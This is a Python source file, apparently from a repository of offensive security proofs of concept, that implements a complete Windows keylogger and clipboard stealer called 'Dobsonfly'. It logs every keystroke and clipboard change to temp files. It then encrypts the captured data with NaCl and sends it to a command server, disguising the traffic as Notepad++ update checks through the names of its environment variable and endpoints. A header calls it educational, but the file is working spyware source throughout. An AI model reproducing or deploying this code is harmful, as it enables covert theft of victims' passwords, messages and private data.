# -------------------------------------------------------------------------
# SECURITY RESEARCH & EDUCATIONAL PURPOSES ONLY
# This script is part of the BugWare repository, a collection of security tools
# and PoCs for learning about attack vectors.
# DO NOT USE THIS FOR ILLEGAL PURPOSES.
# -------------------------------------------------------------------------

"""
Program: Dobsonfly Service (Payload)
Description: A Python-based agent demonstrating clipboard monitoring and keylogging capabilities.
Author: CyberPanther232
Suite: BugWare
Version: 1.0
"""

import win32clipboard
from pynput import keyboard
from threading import Thread
from nacl.public import PrivateKey, Box, PublicKey
from nacl.encoding import HexEncoder
import nacl.utils
import nacl.encoding
import requests
import json
import time
import os
import sys
import traceback
import subprocess

# Exfiltration Functions
SERVER = os.environ.get("NPP_UPDATE_URL", "http://192.168.1.102:8080")
TEMP_DIR = subprocess.getoutput("echo %TEMP%").strip()
USERNAME = subprocess.getoutput("echo %USERNAME%").strip() 
TIMESTAMP = time.strftime("%Y%m%d-%H%M%S")

try:
    os.path.exists(TEMP_DIR)
except:
    TEMP_DIR = "C:\\Windows\\Temp"

def log_debug(msg):
    try:
        with open(os.path.join(TEMP_DIR, "npp_debug.log"), "a") as f:
            f.write(f"{time.ctime()}: {msg}\n")
    except:
        pass

# Data Storage and Extraction Functions
def store_keystroke_data(keystroke: str) -> None:
    try:
        filepath = os.path.join(TEMP_DIR, f"keystrokes_{USERNAME}_{TIMESTAMP}.txt")
        # Ensure directory exists (temp should exist, but good practice)
        
        mode = "a" if os.path.exists(filepath) else "w"
        with open(filepath, mode, encoding="utf-8") as f:
            f.write(keystroke)
    except Exception as e:
        log_debug(f"Store Keystroke Error: {e}")
    
def store_clipboard_data(clipboard: str) -> None:
    try:
        filepath = os.path.join(TEMP_DIR, f"clipboard_{USERNAME}_{TIMESTAMP}.txt")
        mode = "a" if os.path.exists(filepath) else "w"
        with open(filepath, mode, encoding="utf-8") as f:
            f.write(clipboard + "\n")
    except Exception as e:
        log_debug(f"Store Clipboard Error: {e}")

def extract_stored_data(clipboard_path, keystroke_path) -> tuple:
    clipboard = ""
    keystrokes = ""
    
    if os.path.exists(clipboard_path):
        try:
            with open(clipboard_path, "r", encoding="utf-8") as f:
                clipboard = f.read()
            os.remove(clipboard_path)
        except Exception:
            pass
    
    if os.path.exists(keystroke_path):
        try:
            with open(keystroke_path, "r", encoding="utf-8") as f:
                keystrokes = f.read()
            os.remove(keystroke_path)
        except Exception:
            pass
    
    return clipboard, keystrokes

# Exfiltration Thread
def check_for_updates(key_exchange_status_ref: int, private_key: PrivateKey, public_key: bytes) -> None:
    box = None
    key_exchange_status = key_exchange_status_ref # Local copy/management
    
    while True:
        if key_exchange_status == 1:
            try:
                # Key Exchange
                pub_hex_str = public_key.encode(encoder=nacl.encoding.HexEncoder).decode()
                response = requests.post(SERVER + "/key-exchange", json={"pubkey": pub_hex_str}, timeout=10)
                
                if response.status_code == 200:
                    update_info = response.json()
                    server_pubkey_hex = update_info.get("pubkey", "")
                    
                    if server_pubkey_hex:
                        server_pubkey = PublicKey(server_pubkey_hex, encoder=nacl.encoding.HexEncoder)
                        box = Box(private_key, server_pubkey)
                        key_exchange_status = 0
                else:
                    time.sleep(5)
            except Exception as e:
                log_debug(f"Key exchange error: {e}")
                time.sleep(5)
        
        if key_exchange_status == 0 and box:
             # Check for data
            clip_path = os.path.join(TEMP_DIR, f"clipboard_{USERNAME}_{TIMESTAMP}.txt")
            keys_path = os.path.join(TEMP_DIR, f"keystrokes_{USERNAME}_{TIMESTAMP}.txt")
            
            has_data = False
            if os.path.exists(clip_path) and os.path.getsize(clip_path) > 0: has_data = True
            if os.path.exists(keys_path) and os.path.getsize(keys_path) > 0: has_data = True
            
            if not has_data:
                time.sleep(5)
                continue

            clipboard_data, keystroke_data = extract_stored_data(clip_path, keys_path)

            try:
                nonce = nacl.utils.random(Box.NONCE_SIZE)
                
                # Encrypt
                encrypted_clipboard = box.encrypt(clipboard_data.encode("utf-8"), nonce)
                encrypted_keystrokes = box.encrypt(keystroke_data.encode("utf-8"), nonce)
                
                payload = {
                    "id": f"{USERNAME}_{TIMESTAMP}",
                    "clipboard": nacl.encoding.HexEncoder.encode(encrypted_clipboard.ciphertext).decode(),
                    "keystrokes": nacl.encoding.HexEncoder.encode(encrypted_keystrokes.ciphertext).decode(),
                    "nonce": nacl.encoding.HexEncoder.encode(nonce).decode(),
                    "pubkey": public_key.encode(encoder=nacl.encoding.HexEncoder).decode()
                }
                
                headers = {'Content-Type': 'application/json'}
                response = requests.post(SERVER + "/check-for-updates", data=json.dumps(payload), headers=headers, timeout=10)
                
                if response.status_code != 200:
                    # Key rotation or error? Reset exchange
                    key_exchange_status = 1
            
            except Exception as e:
                log_debug(f"Exfil Loop Error: {e}")
                
        time.sleep(10)

# Encryption Functions
def generate_keys() -> tuple:
    priv = PrivateKey.generate()
    pub = priv.public_key
    return priv, pub

def encrypt_data(data: bytes, box: Box) -> tuple:
    nonce = nacl.utils.random(Box.NONCE_SIZE)
    encrypted = box.encrypt(data, nonce)
    return encrypted.ciphertext, nonce

# Keystroke monitoring functions
def on_press(key) -> None:
    try:
        store_keystroke_data(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            store_keystroke_data(" ")
        elif key == keyboard.Key.enter:
            store_keystroke_data("\n")
        elif key == keyboard.Key.backspace:
            store_keystroke_data("\b")
        elif key == keyboard.Key.tab:
            store_keystroke_data("\t")
        else:
            store_keystroke_data(f"[{key.name}]")
    except Exception as e:
        pass
        
def on_release(key) -> None:
    print(f'Key {key} released')
    if key == keyboard.Key.esc:
        # Stop listener
        return False

def start_key_listener():

    # Collect events until released
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()
        
# Clipboard monitoring functions
def get_clipboard_data() -> str:
    try:
        win32clipboard.OpenClipboard()
        if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
            data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
        else:
            data = None
    except Exception as e:
        data = None
    finally:
        try:
            win32clipboard.CloseClipboard()
        except:
            pass

    return data
        
def start_clipboard_monitor():
    recent_value = ""
    while True:
        data = get_clipboard_data()
        if data and data != recent_value:
            recent_value = data
            store_clipboard_data(data)
        time.sleep(0.5)


if __name__ == "__main__":
    try:
        log_debug("Starting Service...")
        log_debug(f"Server URL: {SERVER}")
        
        key_exchange_status = 1
        
        try:
            private_key, public_key = generate_keys()
            log_debug("Keys generated")
        except Exception as e:
            log_debug(f"Key generation failed: {e}")
            raise

        key_exchange_thread = Thread(target=check_for_updates, args=(key_exchange_status, private_key, public_key))
        key_listener_thread = Thread(target=start_key_listener)
        clipboard_monitor_thread = Thread(target=start_clipboard_monitor)

        key_listener_thread.start()
        log_debug("Key Listener started")
        
        clipboard_monitor_thread.start()
        log_debug("Clipboard Monitor started")

        key_exchange_thread.start()
        log_debug("Key Exchange Thread started")

        key_listener_thread.join()
        clipboard_monitor_thread.join()
        key_exchange_thread.join()

    except Exception as e:
        log_debug(f"Main Loop Crash: {e}")
        log_debug(traceback.format_exc())